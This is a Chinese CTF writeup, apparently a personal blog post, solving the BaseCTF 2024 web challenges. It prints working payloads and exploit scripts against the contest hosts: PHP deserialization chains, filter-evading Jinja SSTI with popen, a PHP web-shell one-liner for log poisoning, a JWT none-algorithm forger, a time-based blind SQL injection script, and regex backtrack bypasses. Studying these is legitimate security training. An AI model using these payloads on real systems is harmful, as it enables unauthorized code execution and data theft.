---
title: '2024 BaseCTF WEB Writeup'
description: '略 具体 HTTP header 可参考 HTTP  MDN mozilla.orghttps://developer.mozilla.org/zh-CN/docs/Web/HTTP'
pubDate: 2024-10-15
author: 'IHK-1'
tags: ['CTF', 'BaseCTF', 'WEB', '2024']
---

# WEEK 1
## A Dark Room
F12 查看页面

## HTTP 是什么
略 具体 HTTP header 可参考 [HTTP | MDN (mozilla.org)](https://developer.mozilla.org/zh-CN/docs/Web/HTTP)

## MD5 软绕过
弱比较：md5 0e特性

强比较：数组绕过

## upload
无任何前端过滤，上传 php 一句话木马，访问 uploads/filename 访问即可

## 喵喵喵´•ﻌ•`
RCE 命令执行，使用 system 进行命令执行即可

# WEEK 2
## ez_ser
反序列化 pop 链分析：

web::__wakeup() --> re::__toString() --> pwn::__get() --> Misc::getflag()

代码如下：

```php
<?php
  class re{
  public $chu0;
  }

  class web {
    public $kw;
public $dt;
}

class pwn {
  public $dusk;
  public $over;
}

class Misc {
  public $nothing;
  public $flag;
}

$a = new Misc();

$b = new pwn();
$b -> over = $a;

$c = new re();
$c -> chu0 = $b;

$d = new web();
$d -> kw = $c;

echo serialize($d);
?>
```

## RCEisamazingwithspace

代码只过滤了空格，system 函数相当于在系统以命令执行的方式执行指定内容，所以思路是找到可以在 系统 上等效 空格的字符

在此我用 ${IFS} 进行空格替换

## Really EZ POP
分析反序列化链子：

Nature::__destruct --> Sea::__get --> Shark::__invodke() --> Sink::__toString()

但是私有属性需要手动在类中复制，我们可以构建 __construct 初始化函数在 初始化时进行赋值

```php
<?php

class Sink
{
    private $cmd = "system('cat\${IFS}/flag');";
}

class Shark
{
    private $word;
    public function __construct()
    {
        $this->word = new Sink();
    }
}

class Sea
{
    public $animal;
}

class Nature
{
    public $sea;
}

$a = new Shark();

$b = new Sea();
$b->animal = $a;

$c = new Nature();
$c->sea = $b;

echo urlencode(serialize($c));
?>
```

同时需要注意，urlencode 时，会将空格转换为 + 号，命令执行时候会执行失败，可以搭配 RCEisamazingwithspace 的 ${IFS} 进行命令执行

## 一起吃豆豆
看页面推测为纯前端 js 页面，所以直接分析其前端 js 代码即可，虽然F12 并不起作用，但是可以尝试手动点击浏览器的开发选项查看源代码

搜索结束时，发现解码了 flag 的 base64

## 你听不到我的声音
无回显 RCE，一般是尝试反弹 shell ，不过 反弹shell 需要 & 符号，urlencode 之后也没弹出来，尝试另一个思路，直接将 flag 输出到网站目录下，访问拿到 flag

## 所以你说你懂 MD5? 
第一层 md5 数组绕过

第二层 md5 0e绕过

第三层 md5 强碰撞

第四层 md5 哈希长度拓展攻击

## 数学大师
简单的交互逻辑，EXP 如下：

```python
import requests
import re

url = "http://challenge.basectf.fun:38637/"
session = requests.Session()

response = session.get(url).text
question = re.search(r'Your score is reset to (.*)Tell me in 3 second (.*)\?', response).group(2)
answer = eval(question.replace('÷', '//').replace('×', '*'))

while True:
    response = session.post(url, data={"answer": int(answer)}).text
    try:
        question = re.search(r'Your score is now (.*)Tell me in 3 second (.*)\?', response).group(2)
        answer = eval(question.replace('÷', '//').replace('×', '*'))
    except:
        print(response)
        exit()
```

# WEEK3
## ez_php_jail
第一层 Jail_by.Happy 利用 php 正则特性，Jail[by.Happy 即可传参

所以现在需要绕过 a c s 三个字符，以及如何读取到 /flag 的文件，因为 phpinfo 中一堆命令执行函数被禁止，所以读取文件更加方便，以下为基础思路

```plain
读取文件函数("/flag")
```

发现很多读取文件函数的函数名中包含了 acs ，但是 file，highlight_file 并没有，但是 file 在 phpinfo 中函数被禁止，所以使用 highlight_file

接下来就是构造 /flag 了，其中只有 a 需要绕过，我们尝试直接从环境变量中找到字符并拼接，get("PWD") 回显 /var/www/html ，所以拿到了 a 这个字符，拼接以下即是 "/fl".getenv("PWD")[2]."g"

完整 payload：

```plain
http://challenge.basectf.fun:41846/?Jail[by.Happy=highlight_file("/fl".getenv("PWD")[2]."g");
```

## 复读机

看到 flask 的特征，推测为 SSTI，尝试了 {{ }} 发现被过滤了，可以使用 {% print() %} 

以下为尝试被过滤的内容：

```plain
". __ 被过滤
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']())%}
```

写个 SSTI 进行过滤

发现 137 又 os._wrap_close ，有模板可以进行注入

完整 payload 如下：

```plain
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('whoami')['rea''d']())%}
```

其中 / 被过滤了，可以截取 PWD 第一位

```plain
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('a=`pwd`;a=`substr $a 1 1`;cd $a;cat flag')['rea''d']())%}
```

## 滤个不停
根据要求包含的字符可以推测是日志文件包含，先访问 /<?php system($_POST[shell]);?> 当包含日志时，会当作代码执行

## 玩原神玩的
第一层 sizeof 是判断数组长度的，所以可以使用 len[] 进行传参数组

payload：

```plain
len[]=0&len[]=1&len[]=2&len[]=3&len[]=4&len[]=5&len[]=6&len[]=7&len[]=8&len[]=9&len[]=10&len[]=11&len[]=12&len[]=13&len[]=14&len[]=15&len[]=16&len[]=17&len[]=18&len[]=19&len[]=20&len[]=21&len[]=22&len[]=23&len[]=24&len[]=25&len[]=26&len[]=27&len[]=28&len[]=29&len[]=30&len[]=31&len[]=32&len[]=33&len[]=34&len[]=35&len[]=36&len[]=37&len[]=38&len[]=39&len[]=40&len[]=41&len[]=42&len[]=43&len[]=44
```

进入 tip 进行 get 传参 ?tip=我要玩原神

进入 dumpFlag 函数，POST 传参二维数组，其中 第一个传参 100% 第二个传参 "love100%" . md5($a) 即：love100%30bd7ce7de206924302499f197c7a966，但是这里设了小坑，100% 拼接后面 30xxxx 会被url 编码 即 100 + %30 ，所以 100% 需要进行 url 编码

payload：

```plain
m[]=100%25&m[]=love100%2530bd7ce7de206924302499f197c7a966
```

最后返回每个字符的 md5 异或 位数，写个脚本即可

exp：

```python
import hashlib

md5_list = ["3295c76acbf4caaed33c36b1b5fc2cb1", "26657d5ff9020d2abefe558796b99584", "73278a4a86960eeb576a8fd4c9ec6997",
            "ec8956637a99787bd197eacd77acce5e", "e2c420d928d4bf8ce0ff2ec19b371514", "43ec517d68b6edd3015b3edc9a11367b",
            "ea5d2f1c4608232e07d3aa3d998e5135", "c8ffe9a587b126f152ed3d89a146b445", "f457c545a9ded88f18ecee47145a72c0",
            "03afdbd66e7929b125f8597834fa83a4", "072b030ba126b2f4b2374f342be9ed44", "5f93f983524def3dca464469d2cf9f3e",
            "65b9eea6e1cc6bb9f0cd2a47751a186f", "66f041e16a60928b05a7e228a89c3799", "72b32a1f754ba1c09b3695e0cb6cde7f",
            "03afdbd66e7929b125f8597834fa83a4", "7f39f8317fbdb1988ef4c628eba02591", "6364d3f0f495b6ab9dcf8d3b5c6e0b01",
            "7f6ffaa6bb0b408017b62254211691b5", "19ca14e7ea6328a42e0eb13d585e4c22", "182be0c5cdcd5072bb1864cdee4d3d6e",
            "9f61408e3afb633e50cdf1b20de6f466", "e369853df766fa44e1ed0ff613f563bd", "1c383cd30b7c298ab50293adfecb7b18",
            "c8ffe9a587b126f152ed3d89a146b445", "202cb962ac59075b964b07152d234b70", "b53b3a3d6ab90ce0268229151c9bde11",
            "4c56ff4ce4aaf9573aa5dff913df997a", "a5bfc9e07964f8dddeb95fc584cd965d", "4c56ff4ce4aaf9573aa5dff913df997a",
            "3def184ad8f4755ff269862ea77393dd", "c0c7c76d30bd3dcaefc96f40275bdc0a", "70efdf2ec9b086079795c442636b55fb",
            "14bfa6bb14875e45bba028a21ed38046", "b6d767d2f8ed5d21a44b0e5886680cb9", "b6d767d2f8ed5d21a44b0e5886680cb9",
            "1f0e3dad99908345f7439f8ffabdffc4", "3c59dc048e8850243be8079a5c74d079", "70efdf2ec9b086079795c442636b55fb",
            "70efdf2ec9b086079795c442636b55fb", "35f4a8d465e6e1edc05f3d8ab658c551", "1ff1de774005f8da13f42943881c655f",
            "1f0e3dad99908345f7439f8ffabdffc4", "8e296a067a37563370ded05f5a3bf3ec", "43ec517d68b6edd3015b3edc9a11367b"]

flag = ""
for i in range(len(md5_list)):
    for num in range(128):
        if hashlib.md5(str(num).encode()).hexdigest() == md5_list[i]:
            flag = flag + chr(num ^ i)

print(flag)
```

# WEEK4
## no jwt
分析代码只有 JWT 是可控的

其中解 JWT 时未对 JWT 有任何限制，搜索得知 JWT 攻击可以使用 none 算法

EXP：

```python
import jwt
import datetime

token = jwt.encode({'sub': "admin",'role': 'admin','exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1)}, algorithm='none', key="").decode()
print(token)

```

  

## flag直接读取不就行了？

看特征为原生类利用，先查看 secret 在哪，使用 DirectoryIterator 进行目录遍历

最后使用 SplFileObject 原生类进行文件读取

payload：

```plain
GET ?K=DirectoryIterator&W=/secret
POST J=SplFileObject&H=/secret/f11444g.php
```

## only one sql
```plain
SHOW TABLES
  Tables_in_ctf 
  flag

SHOW COLUMNS FROM flag
  Field Type Null Key Default Extra 
  id varchar(300) YES NULL 
  data varchar(300) YES NULL 

UPDATE flag SET id=1 WHERE data LIKE 'B%' AND IF(data LIKE 'B%',sleep(1),1) // 这点是我没想到的，我还在 SUBSTR 进行切割
```

完整 EXP 如下：

```python
import requests
import time
import string

flag = "B"

while True:
    for word in string.ascii_letters + string.digits + "_.?!{}":
        tmp_flag = flag + word
        url = f"http://challenge.basectf.fun:27906/?sql=UPDATE flag SET id=1 WHERE data LIKE 'B%' AND IF(data LIKE '{tmp_flag}%',sleep(1),1)"

        start_time = time.time()
        response = requests.get(url)
        end_time = time.time()

        if (end_time - start_time) > 0.5:
            flag = tmp_flag
            print(flag)
            break
```

## 圣钥之战1.0
访问 read 路由拿到源代码

```python
from flask import Flask,request
import json

app = Flask(__name__)

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

def is_json(data):
    try:
        json.loads(data)
        return True
    except ValueError:
        return False

class cls():
    def __init__(self):
        pass

instance = cls()

@app.route('/', methods=['GET', 'POST'])
def hello_world():
    return open('/static/index.html', encoding="utf-8").read()

@app.route('/read', methods=['GET', 'POST'])
def Read():
    file = open(__file__, encoding="utf-8").read()
    return f"J1ngHong说：你想read flag吗？
那么圣钥之光必将阻止你！
但是小小的源码没事，因为你也读不到flag(乐)
{file}
"

@app.route('/pollute', methods=['GET', 'POST'])
def Pollution():
    if request.is_json:
        merge(json.loads(request.data),instance)
    else:
        return "J1ngHong说：钥匙圣洁无暇，无人可以污染！"
    return "J1ngHong说：圣钥暗淡了一点，你居然污染成功了？"

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=80)
```

其中 merge 代码是 python 原型链污染特征

```python
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

污染全局变量  __FILE__

在环境变量中拿到 flag

# FIN
## 1z_php
e_m.p  使用 e[m.p 进行传参，intval 可以使用 数字 + 字母绕过，不过后面 ctype_alpha 匹配了字母，所以需要使用 8进制绕过 

```plain
payload：
?e[m.p=0337522
```

第二层 需要绕过 preg_match，即 preg_match 匹配不到 HACKER 但是 stripos 可以匹配到，使用回溯次数绕过

第三层 (new $a($b))->$c() 其中 b 的前三位必须为 php ，可以想到文件包含

```plain
SplFileObject("php://filter/read=convert.base64-encode/resource=index.php")
```

但是后面输出文件内容到函数，可以使用 fgets 

```plain
new SplFileObject("php://filter/read=convert.base64-encode/resource=index.php") -> fgets()
```

此时已经可以任意文件读取了，也可以命令执行

EXP：

```python
import requests

url = "http://challenge.basectf.fun:47750/"
payload_get = "?e[m.p=0337522&a=SplFileObject&b=php://filter/read=convert.base64-encode/resource=index.php&c=fgets"

payload_post = {"try": "a" * 1000001 + "HACKER", "shell": "system('cat flag.php');"}

response = requests.post(url + payload_get, data=payload_post).text
print(response)
```

## Back to the future
使用 githacker 进行扫描 

git show 查看到 flag

## Jinja Mark
lucky_number 可以使用 bp 的数值爆破获取

分析这里的代码，是一个 原型链污染，根据题目的信息应该是需要从 /magic 路由进行原型链污染，将 BLACKLIST_IN_index 进行污染，然后在 /index 中进行 SSTI 注入

尝试全局污染

在 /index 进行 SSTI，发现污染成功了

直接进行 SSTI

```python
{{''.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('whoami').read()}}
```

## RCE or Sql Inject
RCE，使用的是 mysql 的特性 system 进行命令执行

payload：

```plain
%0a system env
```

## ez_php
## cml
